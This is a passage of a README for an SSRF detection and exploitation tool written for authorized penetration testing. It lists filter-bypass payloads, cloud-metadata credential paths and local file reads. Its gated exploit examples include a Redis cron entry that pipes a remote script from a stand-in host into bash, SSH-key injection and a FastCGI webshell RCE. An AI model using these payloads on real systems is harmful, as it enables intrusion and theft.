# wraith

<p align="center">
  <img src="https://raw.githubusercontent.com/bugsyhewitt/bugsyhewitt.github.io/main/public/cards/wraith.jpg" alt="wraith" width="680">
</p>

SSRF (Server-Side Request Forgery) detection and out-of-band confirmation for
the modern bug-bounty and penetration-testing surface.

wraith resurrects the dead-ancestor SSRF tooling
([SSRFmap](https://github.com/swisskyrepo/SSRFmap),
[Gopherus](https://github.com/tarunkant/Gopherus)) as a headless, CLI-first tool
that owns the 2025-2026 frontier: current cloud-metadata endpoints (AWS IMDSv2,
GCP, Azure, Alibaba, Oracle, DigitalOcean, Hetzner), modern filter bypasses (DNS
rebinding, open-redirect chaining, IPv6 and decimal/octal/hex IP encodings),
out-of-band callback confirmation (interactsh-compatible), `dict://` / `gopher://`
protocol tooling, and the emerging MCP / AI-infrastructure SSRF class.

wraith's defining line is **detect and CONFIRM, not weaponize**: it proves SSRF
(including blind SSRF, via an out-of-band canary) and emits suite-standard
findings. It does not execute code, change target state, use harvested
credentials, or open a reverse shell. Weaponization is a deferred, gated v0.2
concern (see [Roadmap](#roadmap)).

> **Status:** v1.0.0. The detection + confirmation engine is complete and stable:
> filter-bypass mutator catalog, cloud-metadata probes (AWS IMDSv1/IMDSv2,
> GCP, Azure instance + managed-identity, Alibaba, Oracle, DigitalOcean,
> Hetzner), OOB confirmation, `dict://` recon, `gopher://` payload generator,
> MCP catalog and internal-SSRF discovery, `ldap://`/`tftp://`/`file://`
> scheme probes, SSRF-based port scanning, open-redirect chaining,
> `--target-file` multi-target scanning, `--timeout`, weaponized `gopher://`
> exploit sequences (v0.2), SARIF 2.1.0 export, HackerOne markdown output,
> and the Azure managed-identity credential probe (critical severity).
> See [`V0.1-CRITERIA.md`](V0.1-CRITERIA.md) for the v0.1 build contract and
> [`RESEARCH.md`](RESEARCH.md) for the niche brief.

## Ethical Use

You are responsible for ensuring you have authorization to test any target.
Only scan systems you own or have explicit written permission to test. SSRF
testing reaches internal and cloud-metadata surface by design; running it
against unauthorized targets may violate computer-fraud laws. The authors accept
no liability for misuse.

## Install

Requires Python 3.13+.

```bash
git clone https://github.com/bugsyhewitt/wraith
cd wraith
python3 -m venv .venv && source .venv/bin/activate
pip install -e .
```

For the hermetic test stack (respx, pytest-httpserver, pytest-socket, dnslib):

```bash
pip install -e ".[dev]"
```

> **Note:** wraith depends on the shared `scan-primitives` scope-enforced HTTP
> client and `h1-reporter` (both git dependencies), plus `dnslib` (the local OOB
> DNS listener) and `cryptography` (the interactsh-compatible OOB client).

## Scope file format

Scope is safety-critical for offensive tooling: an out-of-scope request is
real-world harm. Every wraith request is checked against a scope allowlist
*before any socket is opened* (enforced by `scan-primitives` once wired).

A plain-text file, one entry per line:
- Hostnames: `api.example.com`
- IP addresses: `10.0.0.1`
- CIDR blocks: `192.168.1.0/24`

Lines starting with `#` are ignored. Example `scope.txt`:

```
# Production targets
api.example.com
10.20.30.0/24

# Staging
staging.example.com
```

Pass it with `--scope-file scope.txt`.

## Usage

wraith is organized into subcommands: `scan` (detect + confirm), `dict`
(read-only recon), and `gopher` (payload generator).

```bash
wraith --version          # -> wraith 1.0.0
wraith --help             # subcommand overview
```

Scope is safety-critical and **required** for `scan` and `dict`: with no
authorized entry wraith refuses to run (fail-closed).

### `wraith scan` -- detect + confirm SSRF

The core engine: run the filter-bypass mutator catalog against a marked
injection point and confirm hits out-of-band.

```bash
# Target URL with an explicit injection marker
wraith scan -u "https://app.example.com/proxy?url=FUZZ" --marker FUZZ \
    --scope-file scope.txt --cloud-metadata --oob https://oob.example.net

# Raw HTTP request file (SSRFmap parity), injection point named by param
wraith scan -r request.txt --param url --oob https://oob.example.net --mcp

# Batch scan: newline-delimited file of target URLs (v0.9)
wraith scan --target-file targets.txt --cloud-metadata --scope-file scope.txt
```

- `-u/--target URL` &mdash; target URL to test.
- `-r/--request-file FILE` &mdash; raw HTTP request to replay (SSRFmap parity).
- `--target-file FILE` &mdash; newline-delimited file of target URLs to scan in
  sequence (v0.9). Each URL must contain the injection marker. Blank lines and
  `#` comment lines are ignored. Findings are accumulated and deduplicated
  across all targets before output. Cannot be combined with `-r/--request-file`.
- `--marker STR` &mdash; token in the URL/request that wraith replaces with each
  payload variant (default `FUZZ`).
- `--param NAME` &mdash; explicitly mark the injection point (query param,
  header, body field, or path segment).
- `--cloud-metadata` &mdash; run the cloud-metadata detection probes.
- `--oob COLLAB_URL` &mdash; interactsh-compatible OOB collaborator for
  blind-SSRF confirmation (a DNS-only callback still counts as CONFIRMED).
- `--mcp` &mdash; enable MCP detection in two modes: (1) probe the SSRF injection
  point for internal MCP servers at well-known discovery paths (`/mcp`, `/__mcp`,
  `/.well-known/mcp.json`, `/api/mcp`, `/v1/mcp`, …) and classify echoed
  responses for MCP protocol signatures; (2) run the 5-CVE MCP catalog against
  the target itself as an MCP server endpoint.
- `--mcp-host HOST` &mdash; internal host to probe for MCP servers via SSRF
  discovery (default: `127.0.0.1`).
- `--mcp-port PORT` &mdash; TCP port for `--mcp-host` (default: omitted).
- `--redirect-url REDIR_URL` &mdash; open-redirect endpoint to chain the SSRF
  through (v0.8). Provide the redirect URL with `FUZZ` where the internal
  target URL should be embedded, e.g.
  `https://trusted.com/redir?next=FUZZ`. Generates 3 redirect-chain variants
  (raw, URL-encoded, double-encoded) per internal target — the highest-priority
  bypass class, placed first in the mutator ordering. Use when the target's
  filter only checks the outer URL's domain.
- `--timeout SECS` &mdash; per-request timeout in seconds (default: `10.0`). Tune
  upward for slow targets (e.g. a 30-second timeout for a target that fetches
  internal URLs asynchronously before responding) or downward to speed up scans
  against fast infrastructure.
- `--format {json,text,h1md,sarif}` &mdash; finding output format.

#### `--target-file` format

A plain-text file, one URL per line. `#` comments and blank lines are skipped.
Every URL must already contain the injection marker (default `FUZZ`):

```
# Production endpoints
https://api.example.com/proxy?url=FUZZ
https://api.example.com/fetch?src=FUZZ

# Staging
https://staging.example.com/webhook?callback=FUZZ
```

Pass it with `--target-file targets.txt`. wraith runs the full scan engine
against each URL and emits a single deduplicated findings list at the end.

### `wraith dict` -- dict:// read-only recon

Read-only `dict://` recon through an SSRF primitive: port/banner grab, Redis
`INFO`, Memcached `stats`. Read-only by definition; no target state change.

```bash
wraith dict -u "https://app.example.com/fetch?url=FUZZ" --scope-file scope.txt
```

### `wraith probe` -- ldap:// / tftp:// non-HTTP scheme recon (v0.4)

Inject non-HTTP scheme URLs at the marked SSRF injection point and classify
echoed responses. Works through curl-backed SSRF sinks and any sink that passes
the injected URL to a scheme-aware fetcher. All probes are read-only.

**`ldap://` (LDAP Root DSE)** — reaches internal LDAP/Active Directory servers;
classifies LDIF-format responses for directory service signatures.

```bash
wraith probe --scheme ldap -u "https://app.example.com/fetch?url=FUZZ" \
  --host 10.0.0.5 --port 389 --scope-file scope.txt

# With a specific base DN
wraith probe --scheme ldap -u "https://app.example.com/fetch?url=FUZZ" \
  --host 10.0.0.5 --ldap-base-dn "dc=corp,dc=example" --scope-file scope.txt
```

**`tftp://` (TFTP file-read)** — reaches internal TFTP servers; classifies
file-content signatures for `/etc/passwd` (Unix hosts) and `/boot.ini` (Windows).

```bash
wraith probe --scheme tftp -u "https://app.example.com/fetch?url=FUZZ" \
  --host 10.0.0.5 --scope-file scope.txt

# Probe multiple files
wraith probe --scheme tftp -u "https://app.example.com/fetch?url=FUZZ" \
  --host 10.0.0.5 --tftp-files "/etc/passwd,/boot.ini" --scope-file scope.txt
```

### `wraith probe --scheme file` -- file:// local file read via SSRF (v0.7)

Inject `file://` URLs at the marked SSRF injection point and classify echoed
responses for local-file-content signatures. If the SSRF sink is curl-backed
without a `--proto` scheme allowlist, the server reads its own local filesystem
and may echo sensitive file content through the injection point. Produces a
`critical`-severity finding on confirmation.

Works through curl-backed SSRF sinks (the most common class). Sinks with strict
scheme restrictions (`--proto 'https'`) return an error safely; wraith treats those
as no-hit and moves on. All probes are read-only.

```bash
# Default paths: /etc/passwd, /etc/hosts, /proc/version
wraith probe --scheme file -u "https://app.example.com/fetch?url=FUZZ" \
  --scope-file scope.txt

# Custom paths (Unix + Windows)
wraith probe --scheme file -u "https://app.example.com/fetch?url=FUZZ" \
  --file-paths "/etc/passwd,/etc/shadow,/proc/self/environ" \
  --scope-file scope.txt

# Windows targets
wraith probe --scheme file -u "https://app.example.com/fetch?url=FUZZ" \
  --file-paths "C:/Windows/win.ini,C:/Windows/System32/drivers/etc/hosts" \
  --scope-file scope.txt
```

Parameters:
- `--file-paths PATHS` — comma-separated list of local file paths to probe
  (default: `/etc/passwd,/etc/hosts,/proc/version`)

### `wraith gopher` -- gopher:// payload generator

Generate a `gopher://` payload (RESP / FastCGI byte encoding, correct `%0d%0a`,
single/double URL-encode toggle) and print it for the operator. **Dry-run only**
in v0.1 -- it emits a payload, it never fires a weaponized sequence.

```bash
wraith gopher --protocol redis --command "SET foo bar"   # Redis RESP payload
wraith gopher --protocol redis --command "INFO" --host 10.0.0.5 --port 6379
wraith gopher --protocol fastcgi --double-encode --script /var/www/html/index.php
```

The output is a `gopher://` URL with correct `%0d%0a` CRLF encoding, printed for
the operator to place into a confirmed SSRF primitive. wraith **never fires it**.

## Exploit Mode (v0.2)

> **Ethical-use warning:** `--exploit` fires live attack payloads that may
> cause remote code execution, privilege escalation, or data loss on the target
> system. Only use this against systems you own or have explicit written
> permission to test. The authors accept no liability for misuse.

wraith v0.2 adds three weaponized `gopher://` exploit sequences behind an
explicit `--exploit` gate. The gate is a double opt-in:

1. Pass `--exploit` on the command line (without it, the subcommand exits 2).
2. Confirm the prompt that warns you live payloads are about to fire (or pass
   `--yes`/`-y` to skip it for scripted/CI use).

```bash
wraith exploit --exploit --yes --sequence redis-ssh \
    --exploit-redis-ssh-key "ssh-rsa AAAA... attacker@evil" \
    --host 127.0.0.1 --port 6379
```

### Sequences

#### `redis-cron` — Redis cron-job injection

Encodes a `CONFIG SET dir` + `CONFIG SET dbfilename` + `BGSAVE` sequence that
writes an RDB dump containing a cron entry into `/etc/cron.d/` (or a custom
dir). Requires a confirmed SSRF that reaches a Redis instance with write
permissions.

```bash
wraith exploit --exploit --yes \
    --sequence redis-cron \
    --exploit-redis-cron-dir /etc/cron.d/ \
    --exploit-redis-cron-entry "* * * * * root curl http://cb.example.com/shell|bash" \
    --host 127.0.0.1 --port 6379
```

Parameters:
- `--exploit-redis-cron-dir DIR` — cron drop directory (default: `/etc/cron.d/`)
- `--exploit-redis-cron-entry ENTRY` — cron line(s) to inject (required)

#### `redis-ssh` — Redis SSH authorized_keys injection

Encodes a sequence that writes an attacker SSH pubkey into
`/root/.ssh/authorized_keys` by setting `CONFIG SET dir /root/.ssh/` +
`CONFIG SET dbfilename authorized_keys` + `BGSAVE`.

```bash
wraith exploit --exploit --yes \
    --sequence redis-ssh \
    --exploit-redis-ssh-key "ssh-rsa AAAAB3NzaC1yc2EAAAA... attacker@evil" \
    --host 127.0.0.1 --port 6379
```

Parameters:
- `--exploit-redis-ssh-key PUBKEY` — SSH public key to inject (required)

#### `fastcgi-rce` — FastCGI php-fpm RCE

Encodes a FastCGI FCGI_PARAMS request with `SCRIPT_FILENAME` pointing at a
writable PHP path and `PHP_VALUE auto_prepend_file=php://input`, passing a
`<?php system('...')?>` webshell as `FCGI_STDIN`. Targets unprotected
`php-fpm` sockets reachable via the SSRF.

```bash
wraith exploit --exploit --yes \
    --sequence fastcgi-rce \
    --exploit-fcgi-cmd "id" \
    --exploit-fcgi-webshell-path /var/www/html/shell.php \
    --host 127.0.0.1 --port 9000
```

Parameters:
- `--exploit-fcgi-cmd CMD` — shell command to execute (required)
- `--exploit-fcgi-webshell-path PATH` — `SCRIPT_FILENAME` for the FastCGI
  request (default: `/var/www/html/shell.php`)

### Firing through an SSRF injection point

All three sequences output the generated `gopher://` URL to stdout. Pass
`--target` to have wraith inject it through a confirmed SSRF primitive
(scope-enforced via `--scope-file`):

```bash
wraith exploit --exploit --yes \
    --sequence redis-ssh \
    --exploit-redis-ssh-key "ssh-rsa AAAA... attacker@evil" \
    --host 127.0.0.1 \
    -u "https://app.example.com/fetch?url=FUZZ" \
    --scope-file scope.txt
```

### `--yes` / `-y` — skip confirmation for scripted use

For CI pipelines or automated exploitation chains, pass `--yes` (or `-y`) to
skip the interactive confirmation prompt. Never pipe `--yes` blindly — the
prompt exists to prevent accidental use.

## Modules

| Module | Role | Status |
|---|---|---|
| `wraith.findings` | The pinned suite `Finding` dataclass (lowercase severity, confidence, `cwe_id=918`, OOB proof). | implemented |
| `wraith.sarif` | `to_sarif(findings) -> dict` &mdash; SARIF 2.1.0 export. | implemented |
| `wraith.reporting` | `to_h1md(findings) -> str` &mdash; HackerOne markdown via `h1-reporter`. | implemented |
| `wraith.client` | Scope-enforced HTTP boundary (wired to `scan-primitives`). | implemented |
| `wraith.mutators` | Filter-bypass variant catalog (IP encodings, `@`/`#`/`\`, CRLF, scheme, rebind, open-redirect chaining). | implemented |
| `wraith.metadata` | Cloud-metadata probes (AWS IMDSv1/IMDSv2, GCP, Azure instance + managed-identity, Alibaba, Oracle, DigitalOcean, Hetzner). | implemented |
| `wraith.oob` | OOB confirmation: local dnslib+HTTP collaborator + interactsh-compatible client. | implemented |
| `wraith.engine` | Scan orchestration: request-file parsing, injection, concurrent detect/confirm. | implemented |
| `wraith.protocols` | `dict://` recon + `gopher://` payload generator (RESP / FastCGI) + `ldap://` / `tftp://` / `file://` scheme probes. | implemented |
| `wraith.mcp` | Version-gated MCP / AI-infra SSRF catalog (5 signatures) + internal MCP server discovery via SSRF (`detect_mcp_server_response`, `mcp_ssrf_urls`). | implemented |
| `wraith.cli` | argparse CLI: `scan` / `dict` / `gopher` / `exploit`. | implemented |
| `wraith.exploit` | Weaponized gopher:// sequences: Redis cron/SSH injection, FastCGI RCE (v0.2, `--exploit` gate). | implemented |

## Detection methodology

### SSRF detection pipeline

wraith's core scan flow:

1. **Injection point identification** — a marked URL (default marker: `FUZZ`) or
   a raw HTTP request file specifies where the SSRF injection occurs. The
   injection point can be a query parameter, path segment, header, or body field.
2. **Mutator catalog** — `wraith.mutators` generates every filter-bypass variant
   for the injection point (see [Filter bypass techniques](#filter-bypass-techniques)
   below). The catalog is ordered so the highest-probability bypasses fire first:
   open-redirect chains → userinfo `@` → DNS rebind → parser-differential
   (fragment, backslash, whitespace, CRLF) → IP encodings → scheme variants.
3. **Concurrent detection** — the engine fires each variant concurrently
   (configurable with `--concurrency`) against the target and classifies
   responses: a cloud-metadata response body, an OOB DNS callback, an MCP
   protocol signature, or a service-banner anomaly each produce a finding.
4. **Out-of-band confirmation** — blind SSRF (the app does not echo the fetched
   body) is confirmed via an interactsh-compatible OOB collaborator: wraith
   embeds a unique canary in each payload, and a DNS callback to that canary
   proves the server initiated an outbound request. A DNS-only callback is
   sufficient to emit a CONFIRMED finding.
5. **Finding emission** — every confirmed hit becomes a suite-standard
   `wraith.findings.Finding` (CWE-918, lowercase severity, OOB proof if present)
   exported as JSON, SARIF 2.1.0, or HackerOne markdown.

### Filter bypass techniques

wraith's mutator catalog (`wraith.mutators`) implements seven bypass families,
in the default injection order:

| Family | Variants | Bypass mechanism |
|---|---|---|
| `redirect-chain` | 3 | Embeds the internal target URL inside a trusted-domain open-redirect endpoint. Generated raw, URL-encoded once, and double-encoded. Bypasses allowlists that only check the outer URL's domain. Requires `--redirect-url`. First in the ordering when present. |
| `userinfo` | 2 | Places the decoy host in the userinfo component (`scheme://decoy@internal/path`) and the multi-`@` split variant. Bypasses parsers that extract the host from before the last `@`. |
| `dns-rebind` | 1 | Emits an `rbndr.us` hostname that alternates DNS resolution between an external IP and the internal target on successive lookups (emit-only; wraith never hosts the flip itself). Bypasses filters that check the initial DNS resolution but not subsequent ones. Only emitted for IPv4 literal targets. |
| `parser-differential` | 4 | Fragment hash (`#@decoy`), backslash (`\\@`), whitespace tab (`%09@`), CRLF header injection (`%0d%0aWraith-Canary: 1`). Each exploits inconsistencies between the app's URL validator and its fetcher. |
| `encoding` | 8–9 (IPv4 only) | dword-decimal, hex dotless, hex dotted, octal dotted, octal dotless, two-part `A.B` shorthand, IPv4-mapped IPv6 (`[::ffff:a.b.c.d]`), IPv4-mapped hex (`[::ffff:XXXX:XXXX]`). IPv6 loopback (`[::1]`) added automatically for loopback targets. Only emitted when the internal target has an IPv4 literal host. |
| `scheme` | 2 | Case-varied scheme (`HtTp://`) and malformed slash separator (`http:/\/`). Bypasses scheme allowlists that use case-sensitive or slash-exact matching. |

#### Technique notes

**Open-redirect chaining (`--redirect-url`):**
Pass `--redirect-url "https://trusted.com/redir?next=FUZZ"` when you have a
known open-redirect endpoint on a trusted domain. wraith generates three
variants: the internal URL verbatim, URL-encoded once, and URL-encoded twice.
Any filter that checks only whether the outer URL starts with the trusted domain
will pass all three; the SSRF sink follows the redirect chain to the internal host.

**Userinfo `@` bypass:**
`scheme://trusted.example@169.254.169.254/path` — the userinfo component is not
the host. SSRF filters that call `urllib.parse.urlparse(url).hostname` will see
`169.254.169.254`. The multi-`@` variant (`scheme://trusted@trusted@169.254.169.254/path`)
exploits parsers that split on the first `@` versus the last.

**IP encoding bypass:**
Any valid IPv4 literal can be expressed as a 32-bit decimal integer
(`169.254.169.254` → `2852039166`), a hex dword (`0xa9fea9fe`), per-octet hex
(`0xa9.0xfe.0xa9.0xfe`), or several other forms. Linux libc's `inet_aton` and
most HTTP clients accept all of these; allowlists that only check the dotted-quad
form do not.

**DNS rebind (emit-only):**
The `rbndr.us` service alternates DNS resolution between two IPs on successive
queries. wraith emits the rebind hostname for the operator to inject and observe,
but never hosts the DNS flip itself — self-hosted DNS rebinding is a deferred
item (see [Roadmap](#roadmap)).

**CRLF header injection:**
The `crlf-header-injection` variant appends `%0d%0aWraith-Canary: 1` to the
injected URL. If the SSRF sink constructs an outbound request using the injected
value directly in a header value, the CRLF sequence injects an extra header into
that outbound request. This can smuggle the OOB canary header past a filter that
checks the URL body but not the headers on the outbound request.

### Cloud metadata probes

`wraith.metadata` implements direct probes and via-SSRF classifiers for 8
cloud providers. Each probe is read-only: wraith detects credential-shaped
responses and emits findings; it **never uses harvested credentials** (no SDK
calls, no signing). Secret bytes (access keys, tokens) are redacted from
finding evidence.

| Provider | SSRF path | Credential shape | Severity | Notes |
|---|---|---|---|---|
| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` | `AccessKeyId` + `SecretAccessKey` | critical | Unauthenticated GET; works if IMDSv2 is not enforced. |
| AWS IMDSv2 | PUT `/latest/api/token` → GET creds with `X-aws-ec2-metadata-token` header | `AccessKeyId` + `SecretAccessKey` | critical | Two-step handshake. wraith does the PUT, then GETs creds with the returned session token. |
| AWS IMDSv2 header-injection | SSRF that controls request headers can smuggle the token header onto the outbound GET | `AccessKeyId` + `SecretAccessKey` | critical | CVE-2025-64709 (Typebot). The finding labels the `imdsv2-header-injection` variant and cites the CVE. |
| GCP | `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` with `Metadata-Flavor: Google` | `access_token` + `token_type` + `expires_in` | critical | GCP tokens must be disambiguated from Azure managed-identity tokens: Azure adds a `resource` field that GCP omits. |
| Azure instance | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` with `Metadata: true` | `vmId` + `subscriptionId` + `resourceGroupName` | high | Identity metadata, not a harvested credential. wraith deliberately does NOT send `X-Forwarded-For` (Azure IMDS rejects it). |
| Azure managed identity | `http://169.254.169.254/metadata/identity/oauth2/token?...` with `Metadata: true` | `access_token` + `resource` + `token_type` | critical | Harvested OAuth2 access token for the VM's managed identity. The `resource` field disambiguates from GCP. The classifier checks Azure MI before GCP. |
| Alibaba | `http://100.100.100.200/latest/meta-data/ram/security-credentials/<role>` | `AccessKeyId` + `AccessKeySecret` + `SecurityToken` | critical | RAM role credentials. `AccessKeySecret` (not `SecretAccessKey`) is the Alibaba-specific discriminator. Alibaba is checked before AWS in the classifier to prevent misidentification. |
| Oracle | `http://192.0.0.192/opc/v2/instance/` with `Authorization: Bearer Oracle` | `availabilityDomain` + `compartmentId` + `region` | high | Identity metadata only. |
| DigitalOcean | `http://169.254.169.254/metadata/v1.json` | `droplet_id` + `region` + `interfaces` | high | Unauthenticated JSON endpoint. |
| Hetzner | `http://169.254.169.254/hetzner/v1/metadata` | `availability-zone:` + `instance-id:` + `public-ipv4:` | high | YAML-format response. Hyphenated YAML keys are distinctive and do not collide with any JSON-format provider. No auth header required. |

#### Classifier ordering and false-positive prevention

The via-SSRF response classifier (`detect_from_response`) processes providers
in a fixed order to prevent misidentification:

1. **Alibaba before AWS** — Alibaba bodies also carry `AccessKeyId`; checking
   the 3-marker Alibaba signature first avoids misclassifying Alibaba responses
   as AWS.
2. **Azure managed identity before GCP** — both return `access_token` /
   `token_type` / `expires_in`; Azure MI uniquely adds `resource`, so it must
   be checked first to avoid mis-labelling a critical Azure credential finding
   as GCP.
3. Each provider requires at least 2 of its signatures to match (the `min_hits`
   threshold), preventing single-substring false positives.

### MCP / AI-infrastructure SSRF

The `--mcp` flag enables two modes:

1. **Catalog mode** — run the 5-CVE MCP catalog against the target itself as an
   MCP server endpoint (Typebot CVE-2025-64709, Fetch MCP CVE-2025-65513,
   MCP-Atlassian CVE-2026-27826, LiteLLM, LangChain CVE-2026-26019). Version-
   gated signatures prevent false positives against patched targets.
2. **Discovery mode** — probe the SSRF injection point for internal MCP servers
   at well-known discovery paths (`/mcp`, `/__mcp`, `/.well-known/mcp.json`,
   `/api/mcp`, `/v1/mcp`, …) and classify echoed responses for MCP protocol
   signatures (JSON-RPC 2.0 shape, `jsonrpc` key, `initialize` method).

Both modes use `--mcp-host` / `--mcp-port` to target a specific internal host
(default: `127.0.0.1`).

### Gopher protocol coverage

The `gopher://` payload generator (`wraith gopher`) and the `--exploit` gate
both use `wraith.protocols` byte encoders. Current implementation status:

| Protocol | Status | Payload type | Notes |
|---|---|---|---|
| Redis (RESP) | Implemented | `gopher://` RESP multi-command frames | Supports any RESP command list via `--command`. Weaponized sequences in `--exploit`: cron-job injection, SSH authorized-keys injection. |
| PHP-FPM FastCGI | Implemented | `gopher://` FCGI_BEGIN_REQUEST + FCGI_PARAMS + FCGI_STDIN | Encodes `SCRIPT_FILENAME` + `PHP_VALUE auto_prepend_file = php://input`. Weaponized sequence in `--exploit`: FastCGI RCE. |
| MySQL | Deferred | `gopher://` MySQL client handshake | Pre-auth RCE for older MySQL versions. Deferred: requires verified client protocol byte structure and a container fixture. |
| PostgreSQL | Deferred | `gopher://` FE/BE wire protocol | `COPY TO/FROM PROGRAM` for file read/write. Deferred: protocol byte structure and container fixture. |
| Memcached | Deferred | `gopher://` text protocol | Cache poisoning or slot dump. Deferred: lower destructive surface than MySQL/Postgres, but needs the same gate discipline. |

MySQL, PostgreSQL, and Memcached are deferred because each extends wraith's
destructive surface and requires a protocol-specific opt-in flag beyond the
existing `--exploit` gate, plus hermetic container test fixtures and a named
confirmation that describes the specific side effect to the operator.

### `--exploit` gate: safety model

The `--exploit` flag is a double opt-in that separates detection from
weaponization:

**Without `--exploit`:**
- `wraith scan` detects and confirms SSRF, runs cloud-metadata probes, and runs
  the OOB confirmation engine. It never fires attack payloads.
- `wraith gopher` generates a `gopher://` payload and prints it. It never sends
  the payload to any target.
- Harvested cloud credentials appear in findings as redacted fingerprints
  (`matched signatures AccessKeyId, SecretAccessKey; body_len=N (secret values
  redacted)`). The raw credential bytes are never stored, logged, or used.

**With `--exploit` and `--yes` (skips interactive confirmation):**
- `wraith exploit` sends the weaponized `gopher://` sequence to the target's
  SSRF injection point (scope-enforced via `--scope-file`).
- Three sequences are available: `redis-cron`, `redis-ssh`, `fastcgi-rce`.
- The confirmation prompt is printed to stderr; answer `y`/`yes` or pass `--yes`
  to skip it for scripted/CI use.
- Credentials harvested during an exploit-mode scan are still never used for
  SDK calls or cloud enumeration. The exploitation surface is bounded to the
  three `gopher://` sequences.

**What `--exploit` does NOT cover (deferred — see Roadmap):**
- Cloud credential use (AWS boto3, GCP SDK, Azure SDK calls).
- Redis `MODULE LOAD` RCE.
- MySQL, PostgreSQL, Memcached protocol payloads.
- Reverse shell / connect-back listener.

## Example output

A confirmed cloud-metadata SSRF renders to HackerOne markdown (`--format h1md`)
as:

```markdown
# wraith SSRF findings

**Total findings:** 1

## Finding 1: SSRF to AWS IMDS via url query parameter

**Severity:** HIGH

### Description

SSRF reached `https://app.example.com/proxy?url=http://169.254.169.254/latest/meta-data/`
via the `query:url` injection point. Filter-bypass variant: `dword-decimal:2852039166`.
Confirmed out-of-band -- the server initiated a callback to the wraith canary.
...
```

The same finding exports to SARIF 2.1.0 via `--format sarif` for GitHub Code
Scanning / IDE ingestion, and to JSON via `--format json`.

## Development

```bash
pip install -e ".[dev]"

# Fast unit tier (no network, no build) -- the finding/SARIF/h1md tests:
pytest -m "not ship_gate"

# Full suite incl. the wheel ship-gate (builds + installs into a fresh venv):
pytest
```

The unit tier runs with sockets disabled (via `pytest-socket`, when installed)
so any accidental real egress fails loudly -- the enforcement baseline for the
hermetic test tiers described in `V0.1-CRITERIA.md`.

### Test tiers

wraith's test suite is split into four tiers, ordered by cost and isolation:

| Tier | Marker | Description |
|---|---|---|
| Tier-0 | (default) | Pure-function unit tests: exact-byte assertions on IP encodings, RESP / FastCGI payload structure, `gopher://` URL generation, finding serialization, SARIF shape. Zero I/O; run in milliseconds. |
| Tier-1 | (default) | Mocked-HTTP tests using `respx` to intercept `httpx` transport. Covers cloud-metadata probe request shape (PUT/GET order, header presence/absence), OOB classifier, MCP signature matching. No socket opens. |
| Tier-2 | (default) | Loopback-local fixture tests: in-process `dnslib` OOB listener + `pytest-httpserver` for the OOB confirmation round-trip. Sockets permitted to 127.0.0.1 / ::1 only. |
| Tier-3 | `ship_gate` | Wheel ship-gate: builds the wheel in a subprocess, installs it into a fresh venv, and asserts the entry-point and `--version` output are correct. Excluded from the fast tier. |

Run only Tier-0 and Tier-1 (the fast hermetic unit tests):

```bash
pytest -m "not ship_gate" -q
```

## Roadmap

Full version history: [`CHANGELOG.md`](CHANGELOG.md). Still-deferred post-v1.0
items (with safety rationale): [`POST_V01.md`](POST_V01.md).

v0.1 implemented the detection/confirmation engine per
[`V0.1-CRITERIA.md`](V0.1-CRITERIA.md). v0.2 shipped the weaponized
`gopher://` exploit sequences (see [Exploit Mode](#exploit-mode-v02)).
v0.3 added MCP internal-SSRF discovery (`--mcp` now probes the injection
point for internal MCP servers at well-known paths, not just the target as
an MCP server). v0.4 adds **`ldap://` and `tftp://` scheme probes** (`wraith
probe --scheme ldap|tftp`): inject non-HTTP scheme URLs at the marked SSRF
injection point and classify LDAP Root DSE (LDIF signatures) or TFTP
file-content (`/etc/passwd`, `/boot.ini`) in the echoed response. Works
through curl-backed SSRF sinks. v0.5 completes the **cloud-metadata catalog**
(Hetzner — catalog now covers 7 providers). v0.6 adds **SSRF-based internal
port scanning** (`wraith portscan`): fire `http://<host>:<port>/` at the
marked SSRF injection point for each target port and classify results as OPEN /
FILTERED / CLOSED using response-time and service-banner differentials. 25
default ports; accepts `--ports 80,443,6379` or `--ports 8000-8100`. Emits
medium (banner-confirmed) or info (anomalous timing) findings. v0.7 adds
**`file://` SSRF detection** (`wraith probe --scheme file`): inject
`file:///path` at the SSRF injection point and classify echoed responses for
local-file-content signatures (`/etc/passwd`, `/etc/hosts`, `/proc/version`,
`/proc/self/environ`, and Windows equivalents). Critical-severity finding when
confirmed; read-only by nature. v0.8 adds **open-redirect chaining**
(`--redirect-url`): when a known open-redirect on a trusted domain is
available, wraith generates three bypass variants (raw, URL-encoded,
double-encoded) for each internal SSRF target and places them at the head of
the mutator ordering. Bypasses domain-allowlist filters that only check the
outer URL's hostname. v0.9 adds **`--target-file` multi-target scanning**:
pass a newline-delimited file of target URLs to `wraith scan` and wraith runs
the full scan engine against each one in sequence, accumulating and
deduplicating findings before emitting the combined result. Blank lines and `#`
comments are ignored. Cannot be combined with `-r/--request-file`. v0.9.1 adds
**`--timeout` for `wraith scan`**: expose the per-request timeout (previously
hardcoded at 10 s) so operators can tune it upward for slow internal targets or
downward for fast infrastructure. v0.9.2 adds **Azure managed-identity
credential endpoint**: the IMDS credential probe at
`169.254.169.254/metadata/identity/oauth2/token` is now in both the direct
probe catalog and the via-SSRF injection list; finding severity is `critical`
(harvested OAuth2 access_token, not mere identity metadata). The via-SSRF
classifier checks `azure-managed-identity` before `gcp` to prevent token
response misclassification (both return `access_token`; only Azure MI returns
the disambiguating `resource` field).

The following remain **deferred** post-v0.9. Each item records what it is, the
safety rationale for deferral, and what must be true before it can land.

### Deferred: Redis `MODULE LOAD` RCE

A `MODULE LOAD <url>` sequence loads a compiled Redis module (`.so`) into the
running Redis process, granting arbitrary code execution at Redis's OS
privileges — a significantly more capable primitive than the cron/SSH-key
payloads in `--exploit`. It is deferred because it requires a pre-staged
malicious binary and has a wider blast radius; landing it without a carefully
scoped separate opt-in would make wraith trivially weaponizable against
unintended targets.

**Prerequisites:** a module-staging helper or staging documentation; a
`--module-load` gate distinct from `--exploit`; a mock test fixture against a
Redis RESP stub.

### Deferred: Harvested cloud-credential SDK use (enumerate and exfil)

wraith's IMDS probes emit findings when they recover cloud credentials but
never use them. This deferred item is the next step: use the harvested
credential with the cloud provider's SDK (boto3, google-cloud, azure-identity)
to enumerate accessible resources and optionally exfil selected data. Credential
use is a privilege-escalation step beyond detection; it may trigger cloud-provider
alerting and requires explicit operator authorization beyond what the scope file
provides.

**Prerequisites:** an `--use-creds` gate with a mandatory confirmation step;
optional credential dump to a structured output file; SDK extras kept optional;
a sandboxed test against localstack or azure-emulator.

### Deferred: Reverse-shell / connect-back listener

A reverse shell gives the operator interactive OS access on the target —
weaponization at the highest severity. This must live behind a separate
